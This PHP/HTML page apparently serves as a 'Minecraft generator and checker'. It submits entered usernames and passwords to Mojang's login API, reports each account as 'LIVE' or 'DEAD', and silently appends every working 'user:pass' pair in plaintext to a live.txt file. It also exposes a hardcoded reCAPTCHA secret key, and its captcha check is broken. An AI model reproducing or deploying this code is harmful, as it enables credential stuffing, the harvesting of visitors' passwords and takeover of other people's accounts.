<!DOCTYPE html>
<html lang="en">
<head>
  <title>Minecraft generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
  <link rel="stylesheet" type="text/css" href="style.css">
 <script src='https://www.google.com/recaptcha/api.js'></script>
<meta name="description" content="Free minecraft users generator and checker!">
<meta http-equiv="content-type" content="text/html;charset=UTF-8">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
</head>
<body>
<?php
require_once("MojangLoginAPI.php");
$Yggdrasil = new MojangLoginAPI();
$user = $_POST['username'];
$pass = $_POST['password'];
$captcha=$_POST['g-recaptcha-response'];
if(!isset($captcha))
{
echo '<center><h2>Please check the the captcha form.</h2></center>';
$url='http://likeyflaky.net/checker.html';
   echo '<META HTTP-EQUIV=REFRESH CONTENT="1; '.$url.'">';
exit;
        }
 if(!$captcha){
          echo '<center><h2>Please check the the captcha form.</h2></center>';
$url='http://likeyflaky.net/checker.html';
   echo '<META HTTP-EQUIV=REFRESH CONTENT="1; '.$url.'">';
exit;
        }
 $response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=6Lem8hITAAAAAEXWvdidfpGlarRwPiYjuOZsHGRl&response=".$captcha."&remoteip=".$_SERVER['REMOTE_ADDR']);
	if($response.success==false)
        {
          echo '<h2>You are spammer ! Get the @$%K out</h2>';
        }else
        {
if($Yggdrasil ->login($user, $pass))
{
echo "<center><h1><b>Account ".$Yggdrasil ->getName().", is LIVE!<b></h1></center>";
$url='http://likeyflaky.net/checker.html';
   echo '<META HTTP-EQUIV=REFRESH CONTENT="5; '.$url.'">';
$myfile = fopen("live.txt", "a") or die("Unable to open file!");
$txt = "$user:$pass\n";
fwrite($myfile, $txt);
fclose($myfile);
}
else
{
echo "<center><h1><b>This account is DEAD!</center>";
$url='http://likeyflaky.net/checker.html';
   echo '<META HTTP-EQUIV=REFRESH CONTENT="5; '.$url.'">';
}
}
?>
</body>
</html>
